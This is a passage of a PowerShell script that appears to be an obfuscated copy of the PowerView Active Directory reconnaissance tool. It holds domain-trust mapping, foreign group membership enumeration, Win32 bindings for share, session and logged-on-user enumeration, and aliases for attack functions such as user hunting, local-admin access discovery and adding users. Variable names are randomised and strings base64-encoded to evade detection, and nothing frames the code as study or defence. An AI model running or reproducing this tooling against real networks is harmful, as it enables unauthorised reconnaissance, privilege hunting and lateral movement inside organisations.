            -not (${4ddba7a37af34c91ad3ed60aee04bc0c} -contains $_.samaccountname) } | % {
                ${a0852a4c33684bf0877105c6da3a9074} = $_.samAccountName
                $_.member | % {
                    if (($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwAtADEALQA1AC0AMgAxAC4AKgAtAC4AKgA=')))) -or (${d33ca5a859b64a65a2a6e11c35c88764} -ne ($_.substring($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A')))))))) {
                        ${18b79adcf53e4640aa89d56a339ec1d0} = $_.subString($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        ${dfa85e24773f431f91e73de068d7b94e} = $_.split(",")[0].split("=")[1]
                        ${5a4cae4b62404649bce42a5c9369e57f} = New-Object PSObject
                        ${5a4cae4b62404649bce42a5c9369e57f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${afa30c601e734738b32424a6234484e4}
                        ${5a4cae4b62404649bce42a5c9369e57f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${a0852a4c33684bf0877105c6da3a9074}
                        ${5a4cae4b62404649bce42a5c9369e57f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) ${18b79adcf53e4640aa89d56a339ec1d0}
                        ${5a4cae4b62404649bce42a5c9369e57f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${dfa85e24773f431f91e73de068d7b94e}
                        ${5a4cae4b62404649bce42a5c9369e57f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAE4A'))) $_
                        ${5a4cae4b62404649bce42a5c9369e57f}
                    }
                }
        }
    }
    if (${d722399685d842b19fa5d48261792164}) {
        if(${e22191a1db5b4c5bba42c2b9674b00a8} -or ${a3bf4f2494234d89b62febc9f379f624}) {
            ${0638207c3e9f40e88fc70c3498e54206} = Invoke-MapDomainTrust -e22191a1db5b4c5bba42c2b9674b00a8 -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | % { $_.SourceDomain } | sort -Unique
        }
        else {
            ${0638207c3e9f40e88fc70c3498e54206} = Invoke-MapDomainTrust -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | % { $_.SourceDomain } | sort -Unique
        }
        ForEach(${a2e6c957d163423ea4acfe196f8e4ec4} in ${0638207c3e9f40e88fc70c3498e54206}) {
            Write-Verbose "Enumerating trust groups in domain ${a2e6c957d163423ea4acfe196f8e4ec4}"
            Get-ForeignGroup -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        }
    }
    else {
        Get-ForeignGroup -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
}
function Invoke-MapDomainTrust {
    [CmdletBinding()]
    param(
        [Switch]
        ${e22191a1db5b4c5bba42c2b9674b00a8},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    ${a554c117413047e68c63b4b1a4f665e1} = @{}
    ${226bc9726bab49f483cb497333a0e0ef} = New-Object System.Collections.Stack
    ${0c1c2d9b9c36425ab91eead69b461bfb} = (Get-NetDomain).Name
    ${226bc9726bab49f483cb497333a0e0ef}.push(${0c1c2d9b9c36425ab91eead69b461bfb})
    while(${226bc9726bab49f483cb497333a0e0ef}.Count -ne 0) {
        ${afa30c601e734738b32424a6234484e4} = ${226bc9726bab49f483cb497333a0e0ef}.Pop()
        if (-not ${a554c117413047e68c63b4b1a4f665e1}.ContainsKey(${afa30c601e734738b32424a6234484e4})) {
            Write-Verbose "Enumerating trusts for domain '${afa30c601e734738b32424a6234484e4}'"
            $Null = ${a554c117413047e68c63b4b1a4f665e1}.add(${afa30c601e734738b32424a6234484e4}, "")
            try {
                if(${e22191a1db5b4c5bba42c2b9674b00a8} -or ${a3bf4f2494234d89b62febc9f379f624}) {
                    ${29d1eaa08e0a4ff0a36817a8e4b19ca3} = Get-NetDomainTrust -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -e22191a1db5b4c5bba42c2b9674b00a8 -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
                }
                else {
                    ${29d1eaa08e0a4ff0a36817a8e4b19ca3} = Get-NetDomainTrust -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
                }
                if(${29d1eaa08e0a4ff0a36817a8e4b19ca3} -isnot [system.array]) {
                    ${29d1eaa08e0a4ff0a36817a8e4b19ca3} = @(${29d1eaa08e0a4ff0a36817a8e4b19ca3})
                }
                ${29d1eaa08e0a4ff0a36817a8e4b19ca3} += Get-NetForestTrust -b269a228f63c4b8fa8e609dcda3cbb66 ${afa30c601e734738b32424a6234484e4}
                if (${29d1eaa08e0a4ff0a36817a8e4b19ca3}) {
                    ForEach ($Trust in ${29d1eaa08e0a4ff0a36817a8e4b19ca3}) {
                        ${ad71a0252a90439b8bc8eddb8be26cd3} = $Trust.SourceName
                        ${28442741382a416ca3e3f0ed8b474548} = $Trust.TargetName
                        ${fa286c20aec445dba0057c9c78251ada} = $Trust.TrustType
                        ${115f12f1008342cc9a6e2ade7a1872d0} = $Trust.TrustDirection
                        $Null = ${226bc9726bab49f483cb497333a0e0ef}.push(${28442741382a416ca3e3f0ed8b474548})
                        ${a2e6c957d163423ea4acfe196f8e4ec4} = New-Object PSObject
                        ${a2e6c957d163423ea4acfe196f8e4ec4} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUARABvAG0AYQBpAG4A'))) "${ad71a0252a90439b8bc8eddb8be26cd3}"
                        ${a2e6c957d163423ea4acfe196f8e4ec4} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A'))) "${28442741382a416ca3e3f0ed8b474548}"
                        ${a2e6c957d163423ea4acfe196f8e4ec4} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) "${fa286c20aec445dba0057c9c78251ada}"
                        ${a2e6c957d163423ea4acfe196f8e4ec4} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) "${115f12f1008342cc9a6e2ade7a1872d0}"
                        ${a2e6c957d163423ea4acfe196f8e4ec4}
                    }
                }
            }
            catch {
                Write-Warning "[!] Error: $_"
            }
        }
    }
}
${266a0c5600dd4cca8f9593b602c8b6aa} = New-InMemoryModule -b4b7d1605e134cd4a82daa1d993f1de9 Win32
${cfdd3386c7f24844a68a27f914b56fb0} = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)
${a56f66ff15fc48928509bfd7b19b2d9f} = psenum ${266a0c5600dd4cca8f9593b602c8b6aa} WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
${0802e30f56674260a76187dd4fa2c517} = struct ${266a0c5600dd4cca8f9593b602c8b6aa} WTS_SESSION_INFO_1 @{
    ExecEnvId = field 0 UInt32
    State = field 1 ${a56f66ff15fc48928509bfd7b19b2d9f}
    SessionId = field 2 UInt32
    pSessionName = field 3 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pHostName = field 4 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pUserName = field 5 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pDomainName = field 6 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pFarmName = field 7 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${72ea8f033c674ad89200bae4ac1f7707} = struct ${266a0c5600dd4cca8f9593b602c8b6aa} WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AFYAYQBsAEEAcgByAGEAeQA='))), 20)
}
${d2201d74fe814b0bb1668bd20c885f62} = struct ${266a0c5600dd4cca8f9593b602c8b6aa} SHARE_INFO_1 @{
    shi1_netname = field 0 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${31e19233316045ec9bab727e09cad639} = struct ${266a0c5600dd4cca8f9593b602c8b6aa} WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    wkui1_logon_domain = field 1 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    wkui1_oth_domains = field 2 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    wkui1_logon_server = field 3 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${217be0a6c77e460590ed09c0e660df50} = struct ${266a0c5600dd4cca8f9593b602c8b6aa} SESSION_INFO_10 @{
    sesi10_cname = field 0 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    sesi10_username = field 1 String -c187c8c390a644ce9fc595b967c22e37 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}
${fbe6cc364d3245b18101a19cb1f3c220} = ${cfdd3386c7f24844a68a27f914b56fb0} | Add-Win32Type -d9d1a8ab5b424a43b118c5f77b0d1a94 ${266a0c5600dd4cca8f9593b602c8b6aa} -eafefacad26c4f05a016568789ff5c9f $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA==')))
${347508e7d5c343c383791764772da8a2} = ${fbe6cc364d3245b18101a19cb1f3c220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAYQBwAGkAMwAyAA==')))]
${7e1510d25785470fa1ce4b91dbf94262} = ${fbe6cc364d3245b18101a19cb1f3c220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAA==')))]
${d9976c8cc3cf4fc89c0415702057a193} = ${fbe6cc364d3245b18101a19cb1f3c220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAA==')))]
${26471c1a6bfd4d5db4c768a1e130c4bf} = ${fbe6cc364d3245b18101a19cb1f3c220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwB0AHMAYQBwAGkAMwAyAA==')))]
sal Get-NetForestDomains Get-NetForestDomain
sal Get-NetDomainControllers Get-NetDomainController
sal Get-NetUserSPNs Get-NetUser
sal Invoke-NetUserAdd Add-NetUser
sal Invoke-NetGroupUserAdd Add-NetGroupUser
sal Get-NetComputers Get-NetComputer
sal Get-NetOUs Get-NetOU
sal Get-NetGUIDOUs Get-NetOU
sal Get-NetFileServers Get-NetFileServer
sal Get-NetSessions Get-NetSession
sal Get-NetRDPSessions Get-NetRDPSession
sal Get-NetProcesses Get-NetProcess
sal Get-UserLogonEvents Get-UserEvent
sal Get-UserTGTEvents Get-UserEvent
sal Get-UserProperties Get-UserProperty
sal Get-ComputerProperties Get-ComputerProperty
sal Invoke-UserHunterThreaded Invoke-UserHunter
sal Invoke-ProcessHunterThreaded Invoke-ProcessHunter
sal Invoke-ShareFinderThreaded Invoke-ShareFinder
sal Invoke-SearchFiles Find-InterestingFile
sal Invoke-UserFieldSearch Find-UserField
sal Invoke-ComputerFieldSearch Find-ComputerField
sal Invoke-FindLocalAdminAccess Find-LocalAdminAccess
sal Invoke-FindLocalAdminAccessThreaded Find-LocalAdminAccess
sal Get-NetDomainTrusts Get-NetDomainTrust
sal Get-NetForestTrusts Get-NetForestTrust
sal Invoke-MapDomainTrusts Invoke-MapDomainTrust
sal Invoke-FindUserTrustGroups Find-ForeignUser
sal Invoke-FindGroupTrustUsers Find-ForeignGroup
sal Invoke-EnumerateLocalTrustGroups Invoke-EnumerateLocalAdmin
sal Invoke-EnumerateLocalAdmins Invoke-EnumerateLocalAdmin
sal Invoke-EnumerateLocalAdminsThreaded Invoke-EnumerateLocalAdmin
sal Invoke-FindAllUserTrustGroups Find-ForeignUser
sal Find-UserTrustGroup Find-ForeignUser
sal Invoke-FindAllGroupTrustUsers Find-ForeignGroup
